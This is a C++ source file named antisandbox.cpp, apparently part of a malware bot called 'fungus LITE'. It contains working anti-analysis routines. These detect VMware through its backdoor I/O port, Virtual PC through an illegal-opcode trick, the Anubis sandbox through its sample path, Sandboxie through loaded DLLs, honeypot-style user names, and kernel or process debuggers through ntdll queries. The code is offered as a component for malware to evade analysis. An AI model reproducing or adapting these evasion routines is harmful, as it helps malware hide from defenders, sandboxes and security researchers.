/*
   ___                                           
 /'___\                                          
/\ \__/  __  __    ___      __   __  __    ____  
\ \ ,__\/\ \/\ \ /' _ `\  /'_ `\/\ \/\ \  /',__\  by Zax0mA
 \ \ \_/\ \ \_\ \/\ \/\ \/\ \L\ \ \ \_\ \/\__, `\
  \ \_\  \ \____/\ \_\ \_\ \____ \ \____/\/\____/ LITE
   \/_/   \/___/  \/_/\/_/\/___L\ \/___/  \/___/ 
                            /\____/              
                            \_/__/     
							          

  antisandbox.cpp
  -> anti vmware, sandboxie, anubis, vpc, debugger etc

*/


#include "includes.h"
#include "externs.h"


    //////////////////////////////////////////////////////////////////////////////
	//							Start Sandbox Functions
	//////////////////////////////////////////////////////////////////////////////

    //////////////////////////////////////////////////////////////////////////////
	//							Anti vmware
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_ANTISANDBOX
BOOL AntiSandBox()
{
	char *users[] = {"sandbox", "honey", "vmware", "currentuser"};
	DWORD size = 128;
	char szUser[128];
	int i;
	GetUserName(szUser, &size);
	CharLower(szUser);
	for (i = 0; i <	(sizeof(users) / sizeof(LPTSTR)); i++)
	{
		if (strstr(szUser, users[i]) != 0)
			 return TRUE;
	}
	return FALSE;
}

	//////////////////////////////////////////////////////////////////////////////
	//							Anti Debugger
	//////////////////////////////////////////////////////////////////////////////
bool IsDebuggerRunning(HANDLE hProcess)
{
	HMODULE hModule = GetModuleHandle("ntdll.dll");
	ZW_QUERY_SYSTEM_INFORMATION		ZwQuerySystemInformation;
	ZW_QUERY_INFORMATION_PROCESS	ZwQueryInformationProcess;
    ZwQuerySystemInformation	=	(ZW_QUERY_SYSTEM_INFORMATION)GetProcAddress(hModule, "ZwQuerySystemInformation");
    ZwQueryInformationProcess	=	(ZW_QUERY_INFORMATION_PROCESS)GetProcAddress(hModule, "ZwQueryInformationProcess");
	SYSTEM_KERNEL_DEBUGGER_INFORMATION Info;
	PROCESS_DEBUG_PORT_INFO ProcessInfo;
    if (ZwQuerySystemInformation != NULL)
    {
		if (STATUS_SUCCESS == ZwQuerySystemInformation(SystemKernelDebuggerInformation, &Info, sizeof(Info), NULL))
		{
			if (Info.DebuggerEnabled)
			{
				if (Info.DebuggerNotPresent)
				{
				}
				else
				{
					return TRUE;
				}
			}
			else
			{
			}
		}
		else
		{
		}
    }
	else
	{
	}
	if (ZwQueryInformationProcess != NULL)
	{
		if (STATUS_SUCCESS == ZwQueryInformationProcess(hProcess, ProcessDebugPort, &ProcessInfo, sizeof(ProcessInfo), NULL))
		{
			if (ProcessInfo.DebugPort)
			{
				return TRUE;
			}
			else
			{
			}
		}
		else
		{
		}
	}
	else
	{
	}
	return FALSE;
}

	//////////////////////////////////////////////////////////////////////////////
	//							Anti Virtual PC
	//////////////////////////////////////////////////////////////////////////////
DWORD __forceinline IsInsideVPC_exceptionFilter(LPEXCEPTION_POINTERS ep)
{
  PCONTEXT ctx = ep->ContextRecord;
  ctx->Ebx = -1;
  ctx->Eip += 4;
  return EXCEPTION_CONTINUE_EXECUTION;
}
bool DetectVPC()
{
	bool bVPCIsPresent = FALSE;
	__try
	{
		_asm push ebx
		_asm mov  ebx, 0
		_asm mov  eax, 1
		_asm __emit 0Fh
		_asm __emit 3Fh
		_asm __emit 07h
		_asm __emit 0Bh
		_asm test ebx, ebx
		_asm setz [bVPCIsPresent]
		_asm pop ebx
	}
	__except(IsInsideVPC_exceptionFilter(GetExceptionInformation()))
	{
	}
	return bVPCIsPresent;
}

	//////////////////////////////////////////////////////////////////////////////
	//							Anti VMWARE
	//////////////////////////////////////////////////////////////////////////////
bool DetectVMWare()
{
	bool bVMWareIsPresent = TRUE;
	__try
	{
		__asm
		{
			push   edx
			push   ecx
			push   ebx
			mov    eax, 'VMXh'
			mov    ebx, 0
			mov    ecx, 10
			mov    edx, 'VX'
			in     eax, dx
			cmp    ebx, 'VMXh'
			setz   [bVMWareIsPresent]
			pop    ebx
			pop    ecx
			pop    edx
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		bVMWareIsPresent = FALSE;
	}
	return bVMWareIsPresent;
}

	//////////////////////////////////////////////////////////////////////////////
	//							Anti Anubis
	//////////////////////////////////////////////////////////////////////////////
bool DetectAnubis()
{
   char szBuffer[260];
   GetModuleFileName( 0, szBuffer, sizeof( szBuffer ) );
   if( strstr( szBuffer, "C:\\sample.exe" ) )
      return( true );
   return( false );
}

   	//////////////////////////////////////////////////////////////////////////////
	//						   Get the sandbox - checks done
	//////////////////////////////////////////////////////////////////////////////
bool IsProcessRunningUnderVM()
{
	bool bVMWare;
	bool bVPC;
	bool bAnubis;
	bVMWare	= DetectVMWare();
	bVPC	= DetectVPC();
	bAnubis	= DetectAnubis();
	if (bVPC==TRUE || bVMWare==TRUE || bAnubis==TRUE)
		return TRUE;
	return FALSE;
}

	//////////////////////////////////////////////////////////////////////////////
	//							Anti Sandboxie
	//////////////////////////////////////////////////////////////////////////////
char* sModule[] = { "SbieDll.dll", "dbghelp.dll" };    
bool IsInSandbox()
{
    for( int i = 0; i < ( sizeof( sModule ) / sizeof( char* ) ); i++ )
    {
        if( GetModuleHandle( sModule[ i ] ) ) 
        {
            return true;
        }
    }
    return false;
}
#endif